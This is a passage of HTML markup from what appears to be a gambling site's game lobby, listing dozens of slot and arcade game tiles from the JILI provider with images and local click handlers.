                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Cricket Sah 75" data-filter="ALL,NEW,TOP" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Cricket Sah 75', '/assets/games/i/165x220/jili/a6596104e02bf55757b9a1aebdaa85c3.webp?v=0.1' , '230', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class=" lazyloaded" data-src="/assets/games/i/165x220/jili/a6596104e02bf55757b9a1aebdaa85c3.webp?v=0.1" src="/assets/games/i/165x220/jili/a6596104e02bf55757b9a1aebdaa85c3.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Cricket Sah 75">Cricket Sah 75</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Crazy Pusher" data-filter="ALL,NEW,TOP" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Crazy Pusher', '/assets/games/i/165x220/jili/6c963f91bcc1dd5145d76d22867163b2.webp?v=0.2' , '153', '152' )" style="">

          <div class="content-wrapper">
              
                                    <img class=" lazyloaded" data-src="/assets/games/i/165x220/jili/6c963f91bcc1dd5145d76d22867163b2.webp?v=0.2" src="/assets/games/i/165x220/jili/6c963f91bcc1dd5145d76d22867163b2.webp?v=0.2" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Crazy Pusher">Crazy Pusher</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Bao boon chin" data-filter="ALL,TOP" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Bao boon chin', '/assets/games/i/165x220/jili/2cda522849989bf6801f431ea3434840.webp?v=0.2' , '36', '152' )" style="">

          <div class="content-wrapper">
              
                                    <img class=" lazyloaded" data-src="/assets/games/i/165x220/jili/2cda522849989bf6801f431ea3434840.webp?v=0.2" src="/assets/games/i/165x220/jili/2cda522849989bf6801f431ea3434840.webp?v=0.2" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Bao boon chin">Bao boon chin</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Agent Ace" data-filter="ALL,NEW,TOP" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Agent Ace', '/assets/games/i/165x220/jili/f9521d3e0e3f189b090fd6dd7f54de8a.webp?v=0.2' , '115', '152' )" style="">

          <div class="content-wrapper">
              
                                    <img class=" lazyloaded" data-src="/assets/games/i/165x220/jili/f9521d3e0e3f189b090fd6dd7f54de8a.webp?v=0.2" src="/assets/games/i/165x220/jili/f9521d3e0e3f189b090fd6dd7f54de8a.webp?v=0.2" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Agent Ace">Agent Ace</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Wild Racer" data-filter="ALL,NEW,TOP" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Wild Racer', '/assets/games/i/165x220/jili/b2808ec8d14552017661265f751e9672.webp?v=0.2' , '166', '152' )" style="">

          <div class="content-wrapper">
              
                                    <img class=" lazyloaded" data-src="/assets/games/i/165x220/jili/b2808ec8d14552017661265f751e9672.webp?v=0.2" src="/assets/games/i/165x220/jili/b2808ec8d14552017661265f751e9672.webp?v=0.2" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Wild Racer">Wild Racer</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Bangla Beauty" data-filter="ALL,TOP" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Bangla Beauty', '/assets/games/i/165x220/jili/62f7c1997005d4b52ef898a13f66ba86.webp?v=0.1' , '238', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class=" lazyloaded" data-src="/assets/games/i/165x220/jili/62f7c1997005d4b52ef898a13f66ba86.webp?v=0.1" src="/assets/games/i/165x220/jili/62f7c1997005d4b52ef898a13f66ba86.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Bangla Beauty">Bangla Beauty</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Hot Chilli" data-filter="ALL,TOP" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Hot Chilli', '/assets/games/i/165x220/jili/e8b7776a578a78bfa18c925a1952c165.webp?v=0.1' , '5', '152' )" style="">

          <div class="content-wrapper">
              
                                    <img class=" lazyloaded" data-src="/assets/games/i/165x220/jili/e8b7776a578a78bfa18c925a1952c165.webp?v=0.1" src="/assets/games/i/165x220/jili/e8b7776a578a78bfa18c925a1952c165.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Hot Chilli">Hot Chilli</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="3 Coin Wild Tiger" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    '3 Coin Wild Tiger', '/assets/games/i/165x220/jili/98a3c334993d79090432c0e7e6757c5d.webp?v=0.1' , '622', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class=" lazyloaded" data-src="/assets/games/i/165x220/jili/98a3c334993d79090432c0e7e6757c5d.webp?v=0.1" src="/assets/games/i/165x220/jili/98a3c334993d79090432c0e7e6757c5d.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="3 Coin Wild Tiger">3 Coin Wild Tiger</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="20 Blazing Clover" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    '20 Blazing Clover', '/assets/games/i/165x220/jili/d4a5e292e1611e7f5992f0195b182150.webp?v=0.1' , '581', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class=" lazyloaded" data-src="/assets/games/i/165x220/jili/d4a5e292e1611e7f5992f0195b182150.webp?v=0.1" src="/assets/games/i/165x220/jili/d4a5e292e1611e7f5992f0195b182150.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="20 Blazing Clover">20 Blazing Clover</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="SUPER MAHJONG 2" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'SUPER MAHJONG 2', '/assets/games/i/165x220/jili/9ad4ba2bcf5b8b5088786662e618b2ab.webp?v=0.1' , '757', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class=" lazyloaded" data-src="/assets/games/i/165x220/jili/9ad4ba2bcf5b8b5088786662e618b2ab.webp?v=0.1" src="/assets/games/i/165x220/jili/9ad4ba2bcf5b8b5088786662e618b2ab.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="SUPER MAHJONG 2">SUPER MAHJONG 2</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="3 Lucky Baozhu" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    '3 Lucky Baozhu', '/assets/games/i/165x220/jili/d35be643abf3e0adee98717e13727cd8.webp?v=0.1' , '563', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class=" lazyloaded" data-src="/assets/games/i/165x220/jili/d35be643abf3e0adee98717e13727cd8.webp?v=0.1" src="/assets/games/i/165x220/jili/d35be643abf3e0adee98717e13727cd8.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="3 Lucky Baozhu">3 Lucky Baozhu</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="3 Coin Golden OX" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    '3 Coin Golden OX', '/assets/games/i/165x220/jili/fc84574fca36c0e82132209f5bedc79c.webp?v=0.1' , '547', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class=" lazyloaded" data-src="/assets/games/i/165x220/jili/fc84574fca36c0e82132209f5bedc79c.webp?v=0.1" src="/assets/games/i/165x220/jili/fc84574fca36c0e82132209f5bedc79c.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="3 Coin Golden OX">3 Coin Golden OX</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Clover Coins 3x3" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Clover Coins 3x3', '/assets/games/i/165x220/jili/6f31c57aef180c92e36254e7f6420d55.webp?v=0.1' , '545', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class=" lazyloaded" data-src="/assets/games/i/165x220/jili/6f31c57aef180c92e36254e7f6420d55.webp?v=0.1" src="/assets/games/i/165x220/jili/6f31c57aef180c92e36254e7f6420d55.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Clover Coins 3x3">Clover Coins 3x3</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="10 Sparkling Crown" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    '10 Sparkling Crown', '/assets/games/i/165x220/jili/a013164cffe1df662f6c8cba8aaaa3fc.webp?v=0.1' , '526', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class=" lazyloaded" data-src="/assets/games/i/165x220/jili/a013164cffe1df662f6c8cba8aaaa3fc.webp?v=0.1" src="/assets/games/i/165x220/jili/a013164cffe1df662f6c8cba8aaaa3fc.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="10 Sparkling Crown">10 Sparkling Crown</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Fortune Coins 2" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Fortune Coins 2', '/assets/games/i/165x220/jili/07262f7b34bdcec0c218449aec0fdfbc.webp?v=0.1' , '573', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class=" lazyloaded" data-src="/assets/games/i/165x220/jili/07262f7b34bdcec0c218449aec0fdfbc.webp?v=0.1" src="/assets/games/i/165x220/jili/07262f7b34bdcec0c218449aec0fdfbc.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Fortune Coins 2">Fortune Coins 2</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Boxing King Title Match" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Boxing King Title Match', '/assets/games/i/165x220/jili/36ec75850cd5e2503e093e3a78df775a.webp?v=0.1' , '495', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class=" lazyloaded" data-src="/assets/games/i/165x220/jili/36ec75850cd5e2503e093e3a78df775a.webp?v=0.1" src="/assets/games/i/165x220/jili/36ec75850cd5e2503e093e3a78df775a.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Boxing King Title Match">Boxing King Title Match</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Joker Coins" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Joker Coins', '/assets/games/i/165x220/jili/d268ae289e2a4f128ece6b75d530c3ca.webp?v=0.1' , '529', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class=" lazyloaded" data-src="/assets/games/i/165x220/jili/d268ae289e2a4f128ece6b75d530c3ca.webp?v=0.1" src="/assets/games/i/165x220/jili/d268ae289e2a4f128ece6b75d530c3ca.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Joker Coins">Joker Coins</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Safari King" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Safari King', '/assets/games/i/165x220/jili/294721b39181e27851afa9287436f258.webp?v=0.1' , '408', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class=" lazyloaded" data-src="/assets/games/i/165x220/jili/294721b39181e27851afa9287436f258.webp?v=0.1" src="/assets/games/i/165x220/jili/294721b39181e27851afa9287436f258.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Safari King">Safari King</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Cash Coin" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Cash Coin', '/assets/games/i/165x220/jili/54d3e9d0fa3cdf5c6d7a45131eeaf647.webp?v=0.1' , '583', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class=" lazyloaded" data-src="/assets/games/i/165x220/jili/54d3e9d0fa3cdf5c6d7a45131eeaf647.webp?v=0.1" src="/assets/games/i/165x220/jili/54d3e9d0fa3cdf5c6d7a45131eeaf647.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Cash Coin">Cash Coin</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Crystal 777 DELUXE" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Crystal 777 DELUXE', '/assets/games/i/165x220/jili/7bc398f564b7212aecf8ad28fcd97d8a.webp?v=0.1' , '447', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class=" lazyloaded" data-src="/assets/games/i/165x220/jili/7bc398f564b7212aecf8ad28fcd97d8a.webp?v=0.1" src="/assets/games/i/165x220/jili/7bc398f564b7212aecf8ad28fcd97d8a.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Crystal 777 DELUXE">Crystal 777 DELUXE</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Fortune Gems 500" data-filter="ALL,TOP,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Fortune Gems 500', '/assets/games/i/165x220/jili/bee8912db40e22073dafc3231ad731de.webp?v=0.1' , '540', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class=" lazyloaded" data-src="/assets/games/i/165x220/jili/bee8912db40e22073dafc3231ad731de.webp?v=0.1" src="/assets/games/i/165x220/jili/bee8912db40e22073dafc3231ad731de.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Fortune Gems 500">Fortune Gems 500</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Crazy777 2" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Crazy777 2', '/assets/games/i/165x220/jili/999763e7089d67321fbebdf49f1b5247.webp?v=0.1' , '504', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class=" lazyloaded" data-src="/assets/games/i/165x220/jili/999763e7089d67321fbebdf49f1b5247.webp?v=0.1" src="/assets/games/i/165x220/jili/999763e7089d67321fbebdf49f1b5247.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Crazy777 2">Crazy777 2</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Golden Empire 2" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Golden Empire 2', '/assets/games/i/165x220/jili/7f0be4245579e3086b4daa0bbe9571f6.webp?v=0.1' , '424', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class=" lazyloaded" data-src="/assets/games/i/165x220/jili/7f0be4245579e3086b4daa0bbe9571f6.webp?v=0.1" src="/assets/games/i/165x220/jili/7f0be4245579e3086b4daa0bbe9571f6.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Golden Empire 2">Golden Empire 2</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Bikini Lady" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Bikini Lady', '/assets/games/i/165x220/jili/a0afe75ae5f69cb49d0141782bf9d495.webp?v=0.1' , '423', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class=" lazyloaded" data-src="/assets/games/i/165x220/jili/a0afe75ae5f69cb49d0141782bf9d495.webp?v=0.1" src="/assets/games/i/165x220/jili/a0afe75ae5f69cb49d0141782bf9d495.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Bikini Lady">Bikini Lady</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="3 Coin Treasures 2" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    '3 Coin Treasures 2', '/assets/games/i/165x220/jili/353d5723dd375cf467fc584afebc46d7.webp?v=0.1' , '472', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class=" lazyloaded" data-src="/assets/games/i/165x220/jili/353d5723dd375cf467fc584afebc46d7.webp?v=0.1" src="/assets/games/i/165x220/jili/353d5723dd375cf467fc584afebc46d7.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="3 Coin Treasures 2">3 Coin Treasures 2</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="SUPER MAHJONG" data-filter="ALL,TOP,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'SUPER MAHJONG', '/assets/games/i/165x220/jili/4987cb11cbd4a63dfffe73c75ad36dcb.webp?v=0.1' , '549', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class=" lazyloaded" data-src="/assets/games/i/165x220/jili/4987cb11cbd4a63dfffe73c75ad36dcb.webp?v=0.1" src="/assets/games/i/165x220/jili/4987cb11cbd4a63dfffe73c75ad36dcb.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="SUPER MAHJONG">SUPER MAHJONG</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="3 Charge Buffalo" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    '3 Charge Buffalo', '/assets/games/i/165x220/jili/c8e2757553557364114cfd88ed331e93.webp?v=0.1' , '460', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class=" lazyloaded" data-src="/assets/games/i/165x220/jili/c8e2757553557364114cfd88ed331e93.webp?v=0.1" src="/assets/games/i/165x220/jili/c8e2757553557364114cfd88ed331e93.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="3 Charge Buffalo">3 Charge Buffalo</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Fortune Coins" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Fortune Coins', '/assets/games/i/165x220/jili/1eb847ae61c2117c1d09660bc963a204.webp?v=0.1' , '523', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class=" lazyloaded" data-src="/assets/games/i/165x220/jili/1eb847ae61c2117c1d09660bc963a204.webp?v=0.1" src="/assets/games/i/165x220/jili/1eb847ae61c2117c1d09660bc963a204.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Fortune Coins">Fortune Coins</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Super Ace Joker" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Super Ace Joker', '/assets/games/i/165x220/jili/477045b6236359541f037a844db6f559.webp?v=0.1' , '409', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class=" lazyloaded" data-src="/assets/games/i/165x220/jili/477045b6236359541f037a844db6f559.webp?v=0.1" src="/assets/games/i/165x220/jili/477045b6236359541f037a844db6f559.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Super Ace Joker">Super Ace Joker</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Roma X Deluxe" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Roma X Deluxe', '/assets/games/i/165x220/jili/c20593f185c4ab2048303bf36169aae1.webp?v=0.1' , '517', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class=" lazyloaded" data-src="/assets/games/i/165x220/jili/c20593f185c4ab2048303bf36169aae1.webp?v=0.1" src="/assets/games/i/165x220/jili/c20593f185c4ab2048303bf36169aae1.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Roma X Deluxe">Roma X Deluxe</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="3 Coin Wild Horse" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    '3 Coin Wild Horse', '/assets/games/i/165x220/jili/de6f6d1728004338eae5a8022f108062.webp?v=0.1' , '485', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class=" lazyloaded" data-src="/assets/games/i/165x220/jili/de6f6d1728004338eae5a8022f108062.webp?v=0.1" src="/assets/games/i/165x220/jili/de6f6d1728004338eae5a8022f108062.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="3 Coin Wild Horse">3 Coin Wild Horse</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Coin Tree" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Coin Tree', '/assets/games/i/165x220/jili/9d19db178a6752bbca9fe3340a8a30f0.webp?v=0.1' , '392', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class=" lazyloaded" data-src="/assets/games/i/165x220/jili/9d19db178a6752bbca9fe3340a8a30f0.webp?v=0.1" src="/assets/games/i/165x220/jili/9d19db178a6752bbca9fe3340a8a30f0.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Coin Tree">Coin Tree</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Treasure Quest" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Treasure Quest', '/assets/games/i/165x220/jili/e72cd123e4b83c0d152073184416b69e.webp?v=0.1' , '307', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class=" lazyloaded" data-src="/assets/games/i/165x220/jili/e72cd123e4b83c0d152073184416b69e.webp?v=0.1" src="/assets/games/i/165x220/jili/e72cd123e4b83c0d152073184416b69e.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Treasure Quest">Treasure Quest</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Safari Mystery" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Safari Mystery', '/assets/games/i/165x220/jili/13c31d9fdeb41a91128e1cf35363439a.webp?v=0.1' , '377', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class=" lazyloaded" data-src="/assets/games/i/165x220/jili/13c31d9fdeb41a91128e1cf35363439a.webp?v=0.1" src="/assets/games/i/165x220/jili/13c31d9fdeb41a91128e1cf35363439a.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Safari Mystery">Safari Mystery</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Lucky Doggy" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Lucky Doggy', '/assets/games/i/165x220/jili/ce9caa34fed04bf9a2dbbeb7d2e78fc2.webp?v=0.1' , '374', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class=" lazyloaded" data-src="/assets/games/i/165x220/jili/ce9caa34fed04bf9a2dbbeb7d2e78fc2.webp?v=0.1" src="/assets/games/i/165x220/jili/ce9caa34fed04bf9a2dbbeb7d2e78fc2.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Lucky Doggy">Lucky Doggy</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Super Ace Deluxe" data-filter="ALL,TOP,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Super Ace Deluxe', '/assets/games/i/165x220/jili/0c66fd32bfa64ede70433066e5ec6bca.webp?v=0.1' , '403', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class=" lazyloaded" data-src="/assets/games/i/165x220/jili/0c66fd32bfa64ede70433066e5ec6bca.webp?v=0.1" src="/assets/games/i/165x220/jili/0c66fd32bfa64ede70433066e5ec6bca.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Super Ace Deluxe">Super Ace Deluxe</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Lucky Jaguar" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Lucky Jaguar', '/assets/games/i/165x220/jili/9c5408c653452ce743450c2ce3a4db7c.webp?v=0.1' , '421', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class=" lazyloaded" data-src="/assets/games/i/165x220/jili/9c5408c653452ce743450c2ce3a4db7c.webp?v=0.1" src="/assets/games/i/165x220/jili/9c5408c653452ce743450c2ce3a4db7c.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Lucky Jaguar">Lucky Jaguar</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Legacy of Egypt" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Legacy of Egypt', '/assets/games/i/165x220/jili/acac33eeb090892085a3107a3e091732.webp?v=0.1' , '180', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class=" lazyloaded" data-src="/assets/games/i/165x220/jili/acac33eeb090892085a3107a3e091732.webp?v=0.1" src="/assets/games/i/165x220/jili/acac33eeb090892085a3107a3e091732.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Legacy of Egypt">Legacy of Egypt</h5>
        </a>
        
     
